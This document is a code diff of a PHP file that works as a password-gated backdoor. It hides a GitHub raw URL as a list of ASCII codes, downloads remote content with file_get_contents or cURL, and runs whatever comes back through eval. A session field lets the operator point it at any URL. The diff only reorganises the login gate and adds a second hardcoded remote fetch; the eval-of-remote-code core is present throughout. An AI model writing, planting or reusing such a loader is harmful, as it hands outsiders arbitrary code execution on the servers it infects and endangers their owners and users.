@@ -1,17 +1,23 @@
 <?php
+// Start the session
 session_start();
 
-// Function to fetch URL content via cURL
-function madrid($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
+// Prevent caching of the login page and other sensitive pages
+header("Cache-Control: no-cache, must-revalidate");
+header("Expires: 0");
 
-// Decode ASCII to URL
+// Ensure session timeout is long enough (1 hour)
+ini_set('session.gc_maxlifetime', 3600); // Set session timeout to 1 hour
+
+// Your URL to fetch content from
+$Url = "https://raw.githubusercontent.com/bokaman12/7h3o/refs/heads/main/bandir-put/eikhane/ki/koros/fuck/you/f1.txt";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $Url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$output = curl_exec($ch);
+curl_close($ch);
+
+// Decode the ASCII-encoded URL if needed
 $asciiArray = [
     104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104,
     117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111,
@@ -20,60 +26,60 @@ $asciiArray = [
     98, 97, 110, 100, 105, 114, 45, 112, 117, 116, 47, 101, 105, 107, 104, 97,
     110, 101, 47, 107, 105, 47, 107, 111, 114, 111, 115, 47, 102, 117, 99, 107,
     47, 121, 111, 117, 47, 98, 46, 116, 120, 116
-];    
+];
 
 $decodedString = '';
 foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
 }
 
-$url = $decodedString;
+$url = $decodedString; // Set the URL from the decoded string
 
-// Correct password hash (using bcrypt)
+// Correct password hash
 $correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';
 
-// Check if password reset is requested
+// If reset is requested, clear the session URL
 if (isset($_GET['ts_reset'])) {
     $_SESSION["ts_url"] = "";
     echo "success";
     exit;
 }
 
-// If the user is already authenticated, skip the login prompt
-if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
-    // If not authenticated, display the password form
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        $provided_password = $_POST['password'];
-        if (password_verify($provided_password, $correct_password)) {
-            // Set session on successful password verification
-            $_SESSION['ts_auth'] = true; // Store authentication state in session
-            $_SESSION["ts_url"] = isset($_POST['url']) ? $_POST['url'] : $url; // Store URL in session for later use
-            // Redirect to same page after successful login (with parameters intact)
-            header("Location: " . $_SERVER['REQUEST_URI']);
-            exit;
+// Handle authentication if the 'ts' parameter is set
+if (isset($_GET['ts'])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if (isset($_POST['password'])) {
+            $provided_password = $_POST['password'];
+            if (password_verify($provided_password, $correct_password)) {
+                // Set session flag for successful login
+                $_SESSION['ts_auth'] = true; // Store authentication state in session
+                $_SESSION["ts_url"] = isset($_POST['url']) ? $_POST['url'] : $url; // Set the URL in session
+                // Redirect to same page after authentication
+                header("Location: " . $_SERVER['REQUEST_URI']);
+                exit;
+            } else {
+                echo "Invalid password!";
+                exit;
+            }
         } else {
-            echo "Invalid password! Please try again.";
+            echo "No password provided!";
+            exit;
         }
     }
-
-    // Show password input form if not authenticated
-    ?>
-    <form method="post">
-        <label for="password">Enter Password:</label><br>
-        <input type="password" name="password" id="password" required><br>
-        <input type="submit" value="Submit">
-    </form>
-    <?php
-    exit;
 } else {
-    // If the user is authenticated, fetch and display the URL content
+    // Check if the user is authenticated
+    if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
+        echo "Unauthorized. Please authenticate first.";
+        exit;
+    }
+
+    // If the user is authenticated, fetch the URL content
     if (empty($_SESSION["ts_url"])) {
         $result = @file_get_contents($url);
         if (empty($result)) {
             $result = madrid($url);
         }
     } else {
-        // If there's a custom URL in the session, use it
         $result = @file_get_contents($_SESSION["ts_url"]);
         if (empty($result)) {
             $result = madrid($_SESSION["ts_url"]);
@@ -84,7 +90,17 @@ if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
     if (is_string($result)) {
         eval('?>' . $result);
     } else {
-        echo "Error loading content";
+        echo "Error fetching the content.";
     }
+}
+
+// Function to fetch URL content via cURL (fallback)
+function madrid($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
 }
 ?>
